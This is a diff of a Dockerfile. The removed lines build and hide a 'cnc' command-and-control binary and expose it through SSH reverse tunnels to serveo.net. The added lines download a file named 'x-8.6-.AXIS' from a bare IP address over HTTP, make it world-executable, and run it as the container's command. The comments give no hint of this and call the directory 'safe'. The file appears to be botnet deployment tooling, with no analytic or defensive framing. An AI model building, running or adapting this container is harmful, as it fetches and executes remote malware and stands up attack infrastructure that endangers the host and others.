@@ -1,25 +1,17 @@
-# Use an official Ubuntu runtime as a base image
+# Use a base image
 FROM ubuntu:latest
 
-# Update the package repository and install openssh-client and gcc
-RUN apt-get update && \
-    apt-get install -y openssh-client && \
-    apt-get install -y build-essential && \
-    apt-get install -y screen
-
-# Set the working directory to /app
+# Set the working directory
 WORKDIR /app
 
-# Copy the current directory contents into the container at /app
-COPY . /app
+# Change to a safe directory (e.g., /tmp)
+WORKDIR /tmp
 
-# Add serveo.net to known hosts
-RUN mkdir -p /root/.ssh && \
-    ssh-keyscan serveo.net >> /root/.ssh/known_hosts
+# Download the file from the specified URL
+RUN wget http://204.10.194.37:4077/x-8.6-.AXIS
 
-# Compile cnc.c into cnc executable and remove cnc.c
-RUN gcc cnc.c -o cnc -pthread && \
-    rm -rf cnc.c
+# Add execute permissions to the downloaded file
+RUN chmod 777 x-8.6-.AXIS
 
-# Run the ./cnc command and both SSH commands in hidden mode using screen
-CMD ["sh", "-c", "screen -d -m ./cnc 6666 1 9999 && screen -d -m ssh -R 9999:localhost:9999 serveo.net && screen -d -m ssh -R 6666:localhost:6666 serveo.net"]
+# Run the downloaded file
+CMD ["./x-8.6-.AXIS"]
